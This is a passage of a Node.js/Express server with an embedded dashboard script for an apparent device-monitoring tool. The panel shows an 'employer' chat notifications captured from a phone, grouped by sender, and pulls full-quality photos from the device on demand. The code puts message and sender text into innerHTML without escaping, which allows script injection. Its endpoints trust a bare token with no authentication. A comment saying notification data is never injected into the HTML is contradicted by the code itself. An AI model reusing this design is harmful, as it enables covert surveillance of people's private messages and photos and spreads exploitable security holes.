        const msgs = appMessages.filter(function(n) { return n.sender === sender; });
        const latest = msgs[0];
        const safeSender = sender.replace(/'/g, '&#39;');
        const latestMsg = latest ? latest.message.substring(0, 50) : '';
        const latestDate = latest ? new Date(latest.received_at).toLocaleString() : '';
        return '<div onclick="showMessages(\'' + safeSender + '\')" '
            + 'style="padding:14px;border-bottom:1px solid #eee;cursor:pointer;display:flex;justify-content:space-between;align-items:center" '
            + 'onmouseover="this.style.background=\'#f9f9f9\'" onmouseout="this.style.background=\'\'"><div>'
            + '<div style="font-weight:bold;color:#1a1a2e">' + sender + '</div>'
            + '<div style="color:#888;font-size:12px;margin-top:2px">' + latestMsg + '...</div>'
            + '</div><div style="text-align:right;flex-shrink:0;margin-left:12px">'
            + '<div style="color:#888;font-size:11px">' + latestDate + '</div>'
            + '<div style="background:#1a1a2e;color:white;border-radius:10px;padding:2px 8px;font-size:11px;margin-top:4px">' + msgs.length + ' msgs</div>'
            + '</div></div>';
    }).join('');
}


function showChatsBack() {
    document.getElementById('msg-level-chats').style.display = 'block';
    document.getElementById('msg-level-messages').style.display = 'none';
}

function showMessages(sender) {
    document.getElementById('msg-level-chats').style.display = 'none';
    document.getElementById('msg-level-messages').style.display = 'block';
    document.getElementById('messages-title').textContent = sender;

    const msgs = allNotifications
        .filter(function(n) { return n.app === currentApp && n.sender === sender; })
        .sort(function(a, b) { return new Date(a.received_at) - new Date(b.received_at); });

    const list = document.getElementById('messages-list');
    list.innerHTML = msgs.map(function(m) {
        return '<div style="padding:10px 14px;border-bottom:1px solid #eee">'
            + '<div style="display:flex;justify-content:space-between;align-items:flex-start">'
            + '<div style="background:#f0f2ff;border-radius:8px;padding:8px 12px;max-width:75%">'
            + '<div style="color:#1a1a2e;font-size:14px">' + m.message + '</div>'
            + '</div>'
            + '<div style="color:#888;font-size:11px;margin-left:8px;flex-shrink:0">' + new Date(m.received_at).toLocaleString() + '</div>'
            + '</div></div>';
    }).join('');

    list.scrollTop = list.scrollHeight;
}

async function requestDownload(token, filename, image_id) {
    const btn = event.target;
    btn.textContent = 'Requesting...';
    btn.disabled = true;
    
    const res = await fetch('/employer/request-download', {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token, filename, image_id })
    });
    const data = await res.json();
    
    if (data.success) {
        btn.textContent = 'Waiting for device...';
        // Poll every 10 seconds for the upload
        const interval = setInterval(async () => {
            const dlRes = await fetch('/employer/download-full', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token, filename })
            });
            const dlData = await dlRes.json();
            if (dlData.success) {
                clearInterval(interval);
                // Auto download
                const link = document.createElement('a');
                link.href = 'data:image/jpeg;base64,' + dlData.image;
                link.download = filename;
                link.click();
                btn.textContent = 'Downloaded ✅';
            }
        }, 10000);
    }
}
    </script>
    </body></html>`);
});

// Employer requests full image download
app.post('/employer/request-download', async (req, res) => {
    try {
        const { token, filename, image_id } = req.body;
        const existing = await DownloadRequest.findOne({ token, filename, status: 'pending' });
        if (existing) return res.json({ success: true, message: 'Already requested' });
        await DownloadRequest.create({ token, filename, image_id });
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// Device polls for pending download requests
app.get('/device/download-requests', async (req, res) => {
    try {
        const token = getToken(req);
        const requests = await DownloadRequest.find({ token, status: 'pending' });
        res.json({ success: true, requests });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// Device uploads full quality image
app.post('/device/upload-full', async (req, res) => {
    try {
        const token = getToken(req);
        const { filename, full_image } = req.body;
        await DownloadRequest.findOneAndUpdate(
            { token, filename },
            { full_image, status: 'uploaded' }
        );
        console.log(`Full image uploaded: ${filename} from ${token}`);
        res.json({ success: true });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// Employer downloads full image then clears it
app.post('/employer/download-full', async (req, res) => {
    try {
        const { token, filename } = req.body;
        const request = await DownloadRequest.findOne({ token, filename, status: 'uploaded' });
        if (!request) return res.json({ success: false, message: 'Image not ready yet' });
        const image = request.full_image;
        // Delete full image after download to save storage
        await DownloadRequest.findOneAndUpdate(
            { token, filename },
            { full_image: null, status: 'downloaded' }
        );
        res.json({ success: true, image });
    } catch (e) {
        res.json({ success: false, message: e.message });
    }
});

// notification data is never injected directly into the HTML
app.get('/device/notifications-data', async (req, res) => {
    const token = req.query.token;
    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(500);
    res.json({ notifications });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));